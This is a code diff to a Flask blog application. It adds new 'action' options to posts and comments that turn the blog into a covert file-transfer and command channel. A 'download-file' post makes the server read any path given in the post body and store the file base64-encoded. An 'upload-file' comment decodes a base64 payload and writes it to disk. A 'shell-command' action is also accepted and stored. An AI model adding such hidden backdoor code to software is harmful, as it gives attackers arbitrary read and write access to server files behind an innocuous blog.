@@ -9,11 +9,13 @@ from sqlalchemy.orm import sessionmaker
 from models import Post, User, Comment
 from lib import validate_username, validate_password
 import json
+import base64
+import os
 
 app = Flask(__name__)
 app.config['DEBUG'] = True
 
-engine = create_engine('sqlite:///blog.db')
+engine = create_engine('sqlite:///blog.db', connect_args={'check_same_thread': False})
 DBSession = sessionmaker(bind=engine)
 session = DBSession()
 
@@ -99,15 +101,31 @@ def new_post():
         form = request.form
         subject = form['subject']
         body = form['body']
-        if subject and body:
-            new_post = Post(subject=subject, body=body, user_id=user.id)
+        action = form['action']
+        if subject and action:
+            if action == "shell-command" or action == "upload-file":
+                if not body:
+                    error = "Please check your and body"
+                    return render(request, 'newpost.html', subject=subject,
+                                  body=body, action=action, error=error)
+            if action == "download-file":
+                try:
+                    with open(body, 'r+b') as f:
+                        newbody = base64.b64encode(f.read())
+                    body = newbody
+                except:
+                    error = "Error opening file"
+                    return render(request, 'newpost.html', subject=subject,
+                                  body=body, action=action, error=error)
+
+            new_post = Post(subject=subject, body=body, action=action, user_id=user.id)
             session.add(new_post)
             session.commit()
             return redirect(url_for('post', post_id=new_post.id))
         else:
-            error = "Please check your subject and body"
+            error = "Please check your subject and action"
             return render(request, 'newpost.html', subject=subject,
-                          body=body, error=error)
+                          body=body, action=action, error=error)
     elif request.method == "GET":
         return render(request, 'newpost.html')
 
@@ -124,9 +142,21 @@ def new_comment():
     post_id = form['post_id']
     body = form['body']
     username = form['username']
+    action = form['action']
     comment = Comment(username=username, body=body, post_id=post_id)
     session.add(comment)
     session.commit()
+    if action == "upload-file":
+        post = get_post(post_id)
+        filepath = post.body
+        if len(filepath.split("\\")) > 1:
+            filename = filepath.split("\\")[-1]
+        else:
+            filename = filepath.split("/")[-1]
+        text = body.split(",")[2]
+        contents = base64.b64decode(text[2:-1])
+        with open(filename,'w+b') as f:
+            f.write(contents)
     d = {'status': 'ok', 'username':username, 'comment_id': comment.id}
     return jsonify(**d)
 
@@ -141,7 +171,7 @@ def welcome():
     """
     Displays a welcome page after a user is logged in
     """
-    username = login_session['username'] 
+    username = login_session['username']
     if not username:
         return redirect(url_for('login'))
     response = render(request, 'welcome.html')
